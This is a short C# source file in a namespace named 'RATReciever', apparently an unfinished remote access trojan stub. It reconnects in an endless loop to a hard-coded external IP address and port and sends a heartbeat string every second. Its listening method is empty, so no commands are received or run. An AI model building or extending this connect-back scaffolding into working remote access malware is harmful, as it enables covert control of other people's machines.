using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.IO;


namespace RATReciever
{
    class Program
    {
        static NetworkStream NS;
        static StreamWriter SW;
        static StreamReader SR;
        static TcpClient TCPClient;
        static StringBuilder Input;
        static Thread ConnectThread;
        static int i = 1;
        static void Main(string[] args)
        {
            ConnectThread = new Thread(Client);
            ConnectThread.Start();
            Console.ReadLine();
        }

        static void Client()
        {
            
           
            for (; ; )
            {
                
                if (!IsConnected())
                    Connect();

                try
                {
                    SW.WriteLine("Lolwat");
                    SW.Flush();
                }

                catch
                {
                    Console.WriteLine("Connection Lost :(");
                }
                   
                Thread.Sleep(1000);
            }
        }
        

        static void Listen(TcpClient TCPClient)
        {
            
        }

        static bool IsConnected()
        {
            try
            {
                if (!TCPClient.Connected)
                {
                    return false;
                }
                return true;
            }

            catch
            {
                Console.WriteLine("Starting Connection");
                return false;
            }
        }

        static void Connect()
        {
            try
            {
               TCPClient.Close();
               SR.Close();
               SW.Close();
            }
           
            catch { }
            TCPClient = new TcpClient();
            while (!TCPClient.Connected)
            {
                try
                {
                    TCPClient.Connect("24.237.55.239", 58899);
                    Thread.Sleep(1000);
                }

                catch { }
            }

                Console.WriteLine("Connection Established!");
                NS = TCPClient.GetStream();
                SR = new StreamReader(NS);
                SW = new StreamWriter(NS);
                Input = new StringBuilder();
                Thread.Sleep(1000);
            
            
            //Console.WriteLine("Connected!");
        }



    }
}
